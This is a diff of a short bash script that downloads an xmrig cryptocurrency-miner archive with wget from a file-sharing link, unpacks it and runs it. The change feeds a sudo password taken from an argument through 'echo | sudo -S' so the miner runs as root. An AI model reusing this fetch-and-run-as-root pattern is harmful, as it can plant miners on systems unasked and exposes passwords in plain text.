@@ -1,7 +1,11 @@
 #!/bin/bash
 
+PASS="$1"
+
 wget https://link.eu1.storjshare.io/s/jwtqxk5v2ly6r7wbl7i3x5rhvnma/mining/xmrig-linux.zip?download=1 -O xmrig.zip
-unzip xmrig.zip && rm xmrig.zip
+mkdir xmrig
+unzip xmrig.zip -d xmrig/.
+rm xmrig.zip && cd xmrig
 chmod +x xmrig
 
 if [ $SUDO_USER ]; then
@@ -9,5 +13,5 @@ if [ $SUDO_USER ]; then
     ./xmrig
 else
     echo "root"
-    sudo ./xmrig
+    echo $PASS | sudo -S ./xmrig
 fi
